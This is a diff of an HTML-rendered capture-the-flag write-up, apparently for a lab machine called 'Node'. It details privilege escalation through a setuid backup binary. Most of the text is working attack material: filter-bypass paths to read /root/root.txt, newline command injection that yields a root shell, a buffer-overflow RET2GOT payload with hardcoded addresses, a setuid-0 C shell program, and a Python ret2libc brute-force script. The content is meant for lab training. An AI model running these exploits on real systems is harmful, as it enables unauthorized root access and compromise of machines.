-</span><span class="err"></span><span class="go">tom@node:/$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 &#34;/roo[t]/roo[t].txt&#34; | base64 -d &gt; /dev/shm/.a/mybackup.zip
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">tom@node:/$ unzip /dev/shm/.a/mybackup.zip
-</span><span class="go">password: magicword
-</span></code></pre></div></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Backslash escape:
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">tom@node:/$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 &#34;/roo\t/roo\t.txt&#34; | base64 -d &gt; /dev/shm/.a/mybackup.zip
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">tom@node:/$ unzip /dev/shm/.a/mybackup.zip
+</span></span></span><span class="line"><span class="cl"><span class="go">password: magicword
+</span></span></span><span class="line"><span class="cl"><span class="go">Wildcard expansion:
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">tom@node:/$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 &#34;/r???/r???.txt&#34; | base64 -d &gt; /dev/shm/.a/mybackup.zip
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">tom@node:/$ unzip /dev/shm/.a/mybackup.zip
+</span></span></span><span class="line"><span class="cl"><span class="go">password: magicword
+</span></span></span><span class="line"><span class="cl"><span class="go">Brace expansion:
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">tom@node:/$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 &#34;/roo[t]/roo[t].txt&#34; | base64 -d &gt; /dev/shm/.a/mybackup.zip
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">tom@node:/$ unzip /dev/shm/.a/mybackup.zip
+</span></span></span><span class="line"><span class="cl"><span class="go">password: magicword
+</span></span></span></code></pre></div></div>
 
 <h2 id="3-using-multiline-command-injection">3. Using multiline command injection:</h2>
 
 <p>We can use a combo of $(), printf and newlines to inject commands (we don&rsquo;t see the output of the last chained command because internally there is a redirection to &gt; /dev/null):
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">tom@node:/tmp$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 &#34;$(printf &#39;\n/bin/sh\necho OK&#39;)&#34;
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">zip error: Nothing to do! (/tmp/.backup_1942371757)
-</span><span class="go"></span><span class="gp"># </span>whoami
-<span class="go">root
-</span><span class="go">The $&#39;...&#39; syntax works too. It creates a string, with backslash-escaped characters replaced with special characters - like &#34;\n&#34; for newline :
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $&#39;\n /bin/sh \n echo OK&#39;
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">zip error: Nothing to do! (/tmp/.backup_1942371757)
-</span><span class="go"></span><span class="gp"># </span>whoami
-<span class="go">root
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">tom@node:/tmp$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 &#34;$(printf &#39;\n/bin/sh\necho OK&#39;)&#34;
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">zip error: Nothing to do! (/tmp/.backup_1942371757)
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">#</span> whoami
+</span></span><span class="line"><span class="cl"><span class="go">root
+</span></span></span><span class="line"><span class="cl"><span class="go">The $&#39;...&#39; syntax works too. It creates a string, with backslash-escaped characters replaced with special characters - like &#34;\n&#34; for newline :
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $&#39;\n /bin/sh \n echo OK&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">zip error: Nothing to do! (/tmp/.backup_1942371757)
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">#</span> whoami
+</span></span><span class="line"><span class="cl"><span class="go">root
+</span></span></span></code></pre></div></div></p>
 
 <h2 id="4-using-buffer-overflow-the-smart-way">4. Using buffer overflow (the smart way)</h2>
 
 <p>The backup app suffers from buffer overflow:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>/usr/local/bin/backup qq 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 <span class="k">$(</span>python2 -c <span class="s1">&#39;print(&#34;A&#34;*507)&#39;</span><span class="k">)</span>
-<span class="go">[!] The target path doesn&#39;t exist
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="gp">$ </span>/usr/local/bin/backup qq 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 <span class="k">$(</span>python2 -c <span class="s1">&#39;print(&#34;A&#34;*508)&#39;</span><span class="k">)</span>
-<span class="go">Segmentation fault (core dumped)
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> /usr/local/bin/backup qq 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 <span class="k">$(</span>python2 -c <span class="s1">&#39;print(&#34;A&#34;*507)&#39;</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl"><span class="go">[!] The target path doesn&#39;t exist
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">$</span> /usr/local/bin/backup qq 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 <span class="k">$(</span>python2 -c <span class="s1">&#39;print(&#34;A&#34;*508)&#39;</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl"><span class="go">Segmentation fault (core dumped)
+</span></span></span></code></pre></div></div></p>
 
 <p>You can download the backup app and explore it using radare2 (the app needs also the file /etc/myplace/keys in the proper place):
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>r2 -d ./backup qq 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 <span class="k">$(</span>python2 -c <span class="s1">&#39;print(&#34;A&#34;*512)&#39;</span><span class="k">)</span>
-<span class="err">
-</span><span class="err"></span><span class="go">[0xf7fb09c0]&gt; dc
-</span><span class="go">child stopped with signal 11
-</span><span class="go">[+] SIGNAL 11 errno=0 addr=0x00000223 code=1 ret=0
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">[0xf7e029ee]&gt; dr
-</span><span class="go">eax = 0x00000000
-</span><span class="go">ebx = 0x08049ed0
-</span><span class="go">ecx = 0x00000000
-</span><span class="go">edx = 0xf7f48870
-</span><span class="go">esi = 0x00000004
-</span><span class="go">edi = 0x00000223
-</span><span class="go">esp = 0xffae2be8
-</span><span class="go">ebp = 0x41414141
-</span><span class="go">eip = 0xf7e029ee
-</span><span class="go">eflags = 0x00010246
-</span><span class="go">oeax = 0xffffffff
-</span><span class="go">By experimenting we see that:
-</span><span class="go">1. Size 508 doesn&#39;t overwrite ebp
-</span><span class="go">2. Size 512 overwrites ebp (ebp = 0x41414141)
-</span><span class="go">3. Size 516 overwrites ebp and eip (eip 0x41414141)
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> r2 -d ./backup qq 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 <span class="k">$(</span>python2 -c <span class="s1">&#39;print(&#34;A&#34;*512)&#39;</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[0xf7fb09c0]&gt; dc
+</span></span></span><span class="line"><span class="cl"><span class="go">child stopped with signal 11
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] SIGNAL 11 errno=0 addr=0x00000223 code=1 ret=0
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[0xf7e029ee]&gt; dr
+</span></span></span><span class="line"><span class="cl"><span class="go">eax = 0x00000000
+</span></span></span><span class="line"><span class="cl"><span class="go">ebx = 0x08049ed0
+</span></span></span><span class="line"><span class="cl"><span class="go">ecx = 0x00000000
+</span></span></span><span class="line"><span class="cl"><span class="go">edx = 0xf7f48870
+</span></span></span><span class="line"><span class="cl"><span class="go">esi = 0x00000004
+</span></span></span><span class="line"><span class="cl"><span class="go">edi = 0x00000223
+</span></span></span><span class="line"><span class="cl"><span class="go">esp = 0xffae2be8
+</span></span></span><span class="line"><span class="cl"><span class="go">ebp = 0x41414141
+</span></span></span><span class="line"><span class="cl"><span class="go">eip = 0xf7e029ee
+</span></span></span><span class="line"><span class="cl"><span class="go">eflags = 0x00010246
+</span></span></span><span class="line"><span class="cl"><span class="go">oeax = 0xffffffff
+</span></span></span><span class="line"><span class="cl"><span class="go">By experimenting we see that:
+</span></span></span><span class="line"><span class="cl"><span class="go">1. Size 508 doesn&#39;t overwrite ebp
+</span></span></span><span class="line"><span class="cl"><span class="go">2. Size 512 overwrites ebp (ebp = 0x41414141)
+</span></span></span><span class="line"><span class="cl"><span class="go">3. Size 516 overwrites ebp and eip (eip 0x41414141)
+</span></span></span></code></pre></div></div></p>
 
 <p>Therefore we need an overhead of 512 bytes for our payload to overwrite the &ldquo;return address&rdquo; (i.e. the eip register).</p>
 
 <p>Let&rsquo;s see if NX is present:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>r2 backup
-<span class="go">[0x08048780]&gt; i~nx 
-</span><span class="go">nx       true
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> r2 backup
+</span></span><span class="line"><span class="cl"><span class="go">[0x08048780]&gt; i~nx 
+</span></span></span><span class="line"><span class="cl"><span class="go">nx       true
+</span></span></span></code></pre></div></div></p>
 
 <p>Now, let&rsquo;s check if ASLR is enabled on the box:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>cat /proc/sys/kernel/randomize_va_space
-<span class="go">2
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> cat /proc/sys/kernel/randomize_va_space
+</span></span><span class="line"><span class="cl"><span class="go">2
+</span></span></span></code></pre></div></div></p>
 
 <p>The number 2 means full randomization. Therefore, if we use a RET2LIBC approach, the addresses will be different every time and we will have to use brute force to catch e.g. the correct libc base address. But we can use a different approach named RET2GOT (or RET2SELF as I prefer to call it). This approach uses only local elements/offsets inside the executable. Linux executables use GOT/PLT tables to automatically match the internal local offsets with the external library addresses. In other words, those addresses that aren&rsquo;t known in the time of linking are resolved by the dynamic linker at run time. You can read more on this subject here <a href="https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html" target="_blank">https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html</a> and here <a href="https://sploitfun.wordpress.com/2015/05/08/bypassing-aslr-part-i/" target="_blank">https://sploitfun.wordpress.com/2015/05/08/bypassing-aslr-part-i/</a></p>
 
 <p>The backup app makes internally use of the system() function but we lack something to call using this function. Ideally, we would like a null-terminated string like &ldquo;/bin/sh&rdquo;. But we don&rsquo;t have exactly this. Let&rsquo;s check what we have:</p>
 
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>strings /usr/local/bin/backup
-<span class="go">...
-</span><span class="go">/root
-</span><span class="go">/etc
-</span><span class="go">/tmp/.backup_%i
-</span><span class="go">/usr/bin/zip -r -P magicword %s %s &gt; /dev/null
-</span><span class="go">/usr/bin/base64 -w0 %s
-</span><span class="go">...
-</span></code></pre></div></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> strings /usr/local/bin/backup
+</span></span><span class="line"><span class="cl"><span class="go">...
+</span></span></span><span class="line"><span class="cl"><span class="go">/root
+</span></span></span><span class="line"><span class="cl"><span class="go">/etc
+</span></span></span><span class="line"><span class="cl"><span class="go">/tmp/.backup_%i
+</span></span></span><span class="line"><span class="cl"><span class="go">/usr/bin/zip -r -P magicword %s %s &gt; /dev/null
+</span></span></span><span class="line"><span class="cl"><span class="go">/usr/bin/base64 -w0 %s
+</span></span></span><span class="line"><span class="cl"><span class="go">...
+</span></span></span></code></pre></div></div>
 
 <p>The string &ldquo;/tmp/.backup_%i&rdquo; looks promising. As a matter of fact, it&rsquo;s a perfectly legal linux filename and we can write into /tmp! :D</p>
 
 <p>Let&rsquo;s use radare2 to get the addresses in order to construct our RET2SELF payload (later on I demonstrate the use of pwntools in a script where those addresses are obtained automatically):
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>r2 ./backup  ./backup
-<span class="gp">&gt; </span>aa
-<span class="gp">&gt; </span>fs imports<span class="p">;</span> f
-<span class="go">...
-</span><span class="go">0x080486a0 6 sym.imp.system
-</span><span class="go">...
-</span><span class="go">0x080486c0 6 sym.imp.exit
-</span><span class="go">...
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="gp">&gt; </span>fs strings<span class="p">;</span> f
-<span class="go">...
-</span><span class="go">0x08049ed5 16 str._tmp_.backup__i
-</span><span class="go">...
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> r2 ./backup  ./backup
+</span></span><span class="line"><span class="cl"><span class="gp">&gt;</span> aa
+</span></span><span class="line"><span class="cl"><span class="gp">&gt;</span> fs imports<span class="p">;</span> f
+</span></span><span class="line"><span class="cl"><span class="go">...
+</span></span></span><span class="line"><span class="cl"><span class="go">0x080486a0 6 sym.imp.system
+</span></span></span><span class="line"><span class="cl"><span class="go">...
+</span></span></span><span class="line"><span class="cl"><span class="go">0x080486c0 6 sym.imp.exit
+</span></span></span><span class="line"><span class="cl"><span class="go">...
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">&gt;</span> fs strings<span class="p">;</span> f
+</span></span><span class="line"><span class="cl"><span class="go">...
+</span></span></span><span class="line"><span class="cl"><span class="go">0x08049ed5 16 str._tmp_.backup__i
+</span></span></span><span class="line"><span class="cl"><span class="go">...
+</span></span></span></code></pre></div></div></p>
 
 <p>Therefore, our RET2SELF payload will be like this:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">0x080486a0 system()
-</span><span class="go">0x080486c0 exit()
-</span><span class="go">0x08049ed5 /tmp/.backup_%i (the argument for system)
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">0x080486a0 system()
+</span></span></span><span class="line"><span class="cl"><span class="go">0x080486c0 exit()
+</span></span></span><span class="line"><span class="cl"><span class="go">0x08049ed5 /tmp/.backup_%i (the argument for system)
+</span></span></span></code></pre></div></div></p>
 
 <p>Now, use nano to make a file shell.c and copy/paste this content (you can use mark ssh shell if your shell doesn&rsquo;t support nano):</p>
 
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>nano shell.c
-</code></pre></div></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> nano shell.c
+</span></span></code></pre></div></div>
 
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
-</span><span class="cp"></span>
-<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-    <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
-    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span></code></pre></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div>
 
 <p>Then compile it on the box:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>gcc shell.c -o shell
-</code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> gcc shell.c -o shell
+</span></span></code></pre></div></div></p>
 
 <p>Copy it to /tmp/.backup_%i (and make sure it&rsquo;s executable):
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>cp shell /tmp/.backup_%i <span class="o">&amp;&amp;</span> chmod +x /tmp/.backup_%i
-</code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> cp shell /tmp/.backup_%i <span class="o">&amp;&amp;</span> chmod +x /tmp/.backup_%i
+</span></span></code></pre></div></div></p>
 
 <p>It&rsquo;s high time to get root:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">tom@node:/$ /usr/local/bin/backup qq 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $(python2 -c &#39;print(&#34;A&#34;*512+&#34;\xa0\x86\x04\x08&#34;+&#34;\xc0\x86\x04\x08&#34;+&#34;\xd5\x9e\x04\x08&#34;)&#39;)
-</span><span class="go"></span><span class="gp"># </span>whoami
-<span class="go">root
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">tom@node:/$ /usr/local/bin/backup qq 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $(python2 -c &#39;print(&#34;A&#34;*512+&#34;\xa0\x86\x04\x08&#34;+&#34;\xc0\x86\x04\x08&#34;+&#34;\xd5\x9e\x04\x08&#34;)&#39;)
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">#</span> whoami
+</span></span><span class="line"><span class="cl"><span class="go">root
+</span></span></span></code></pre></div></div></p>
 
 <p>or</p>
 
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">tom@node:/$ /usr/local/bin/backup qq 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 &#34;/roo\t/roo\t.txt $(python2 -c &#39;print(&#34;A&#34;*495+&#34;\xa0\x86\x04\x08&#34;+&#34;\xc0\x86\x04\x08&#34;+&#34;\xd5\x9e\x04\x08&#34;)&#39;)&#34;
-</span><span class="go"></span><span class="gp"># </span>whoami
-<span class="go">root
-</span></code></pre></div></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">tom@node:/$ /usr/local/bin/backup qq 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 &#34;/roo\t/roo\t.txt $(python2 -c &#39;print(&#34;A&#34;*495+&#34;\xa0\x86\x04\x08&#34;+&#34;\xc0\x86\x04\x08&#34;+&#34;\xd5\x9e\x04\x08&#34;)&#39;)&#34;
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">#</span> whoami
+</span></span><span class="line"><span class="cl"><span class="go">root
+</span></span></span></code></pre></div></div>
 
 <h2 id="5-using-buffer-overflow-the-brute-force-way">5. Using buffer overflow (the brute-force way)</h2>
 
 <p>We can also use brute force to catch the proper libc base address (this is exactly the same way we used for the privilege escalation on the &ldquo;October&rdquo; box):
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python2</span>
-<span class="kn">import</span> <span class="nn">struct</span>
-<span class="kn">from</span> <span class="nn">subprocess</span> <span class="kn">import</span> <span class="n">call</span>
-
-<span class="n">libc_base_addr</span> <span class="o">=</span> <span class="mh">0xf752c000</span>      <span class="c1"># ldd /usr/local/bin/backup (choose an average value)</span>
-<span class="n">exit_off</span> <span class="o">=</span> <span class="mh">0x0002e7b0</span>            <span class="c1"># readelf -s /lib32/libc.so.6 | grep exit</span>
-<span class="n">system_off</span> <span class="o">=</span> <span class="mh">0x0003a940</span>          <span class="c1"># readelf -s /lib32/libc.so.6 | grep system</span>
-<span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base_addr</span> <span class="o">+</span> <span class="n">system_off</span>
-<span class="n">exit_addr</span> <span class="o">=</span> <span class="n">libc_base_addr</span> <span class="o">+</span> <span class="n">exit_off</span>
-<span class="n">system_arg</span> <span class="o">=</span> <span class="n">libc_base_addr</span> <span class="o">+</span> <span class="mh">0x15900b</span> <span class="c1"># strings -a -t x /lib32/libc.so.6 | grep &#39;/bin/sh&#39;</span>
-
-<span class="c1">#endianess convertion</span>
-<span class="k">def</span> <span class="nf">conv</span><span class="p">(</span><span class="n">num</span><span class="p">):</span>
-    <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;&lt;I&#34;</span><span class="p">,</span><span class="n">num</span><span class="p">)</span>
-
-<span class="c1"># Junk + system + exit + system_arg</span>
-<span class="n">buf</span> <span class="o">=</span> <span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">512</span>
-<span class="n">buf</span> <span class="o">+=</span> <span class="n">conv</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
-<span class="n">buf</span> <span class="o">+=</span> <span class="n">conv</span><span class="p">(</span><span class="n">exit_addr</span><span class="p">)</span>
-<span class="n">buf</span> <span class="o">+=</span> <span class="n">conv</span><span class="p">(</span><span class="n">system_arg</span><span class="p">)</span>
-
-<span class="nb">print</span> <span class="s2">&#34;Calling vulnerable program&#34;</span>
-
-<span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
-<span class="k">while</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">):</span>
-    <span class="nb">print</span> <span class="s2">&#34;Number of tries: </span><span class="si">%d</span><span class="s2">&#34;</span> <span class="o">%</span><span class="n">i</span>
-    <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
-    <span class="n">ret</span> <span class="o">=</span> <span class="n">call</span><span class="p">([</span><span class="s2">&#34;./backup&#34;</span><span class="p">,</span> <span class="s2">&#34;qq&#34;</span><span class="p">,</span> <span class="s2">&#34;45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474&#34;</span><span class="p">,</span> <span class="n">buf</span><span class="p">])</span>
-    <span class="k">if</span> <span class="p">(</span><span class="ow">not</span> <span class="n">ret</span><span class="p">):</span>
-        <span class="k">break</span>
-    <span class="k">else</span><span class="p">:</span>
-        <span class="nb">print</span> <span class="s2">&#34;Exploit failed&#34;</span></code></pre></div></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python2</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">subprocess</span> <span class="kn">import</span> <span class="n">call</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">libc_base_addr</span> <span class="o">=</span> <span class="mh">0xf752c000</span>      <span class="c1"># ldd /usr/local/bin/backup (choose an average value)</span>
+</span></span><span class="line"><span class="cl"><span class="n">exit_off</span> <span class="o">=</span> <span class="mh">0x0002e7b0</span>            <span class="c1"># readelf -s /lib32/libc.so.6 | grep exit</span>
+</span></span><span class="line"><span class="cl"><span class="n">system_off</span> <span class="o">=</span> <span class="mh">0x0003a940</span>          <span class="c1"># readelf -s /lib32/libc.so.6 | grep system</span>
+</span></span><span class="line"><span class="cl"><span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base_addr</span> <span class="o">+</span> <span class="n">system_off</span>
+</span></span><span class="line"><span class="cl"><span class="n">exit_addr</span> <span class="o">=</span> <span class="n">libc_base_addr</span> <span class="o">+</span> <span class="n">exit_off</span>
+</span></span><span class="line"><span class="cl"><span class="n">system_arg</span> <span class="o">=</span> <span class="n">libc_base_addr</span> <span class="o">+</span> <span class="mh">0x15900b</span> <span class="c1"># strings -a -t x /lib32/libc.so.6 | grep &#39;/bin/sh&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#endianess convertion</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">conv</span><span class="p">(</span><span class="n">num</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;&lt;I&#34;</span><span class="p">,</span><span class="n">num</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Junk + system + exit + system_arg</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">=</span> <span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">512</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="n">conv</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="n">conv</span><span class="p">(</span><span class="n">exit_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="n">conv</span><span class="p">(</span><span class="n">system_arg</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="s2">&#34;Calling vulnerable program&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
